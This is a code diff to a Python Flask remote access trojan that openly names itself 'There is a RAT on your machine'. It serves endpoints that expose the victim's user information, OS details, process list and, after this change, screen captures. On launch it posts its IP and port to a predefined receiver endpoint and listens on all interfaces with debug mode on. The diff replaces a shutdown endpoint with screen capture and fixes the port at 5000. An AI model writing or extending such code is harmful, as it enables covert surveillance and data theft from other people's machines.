@@ -4,13 +4,14 @@ import requests, os, getpass, platform, psutil, mss, socket
 app = Flask("There is a RAT on your machine")
 PREDEFINED_ENDPOINT = "http://0.0.0.0:8080/receiver"
 
+
 @app.route("/")
 def root():
     endpoints = {
         "/user": "user information",
         "/os": "os details",
         "/proc": "list processes",
-        "/shutdown": "shutdown",
+        "/screen": "capture screen",
     }
     return jsonify(endpoints)
 
@@ -50,12 +51,8 @@ def make_screen():
 
 
 if __name__ == "__main__":
-    def find_free_port():
-        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-            s.bind(('', 0))
-            return s.getsockname()[1]
-
-    port = find_free_port()
     ip = socket.gethostbyname(socket.gethostname())
-    requests.post(PREDEFINED_ENDPOINT, json={"status": "online", "ip": ip, "port": port})
-    app.run(host="0.0.0.0", port=port, debug=True)
+    requests.post(
+        PREDEFINED_ENDPOINT, json={"status": "online", "ip": ip, "port": "5000"}
+    )
+    app.run(host="0.0.0.0", port="5000", debug=True)
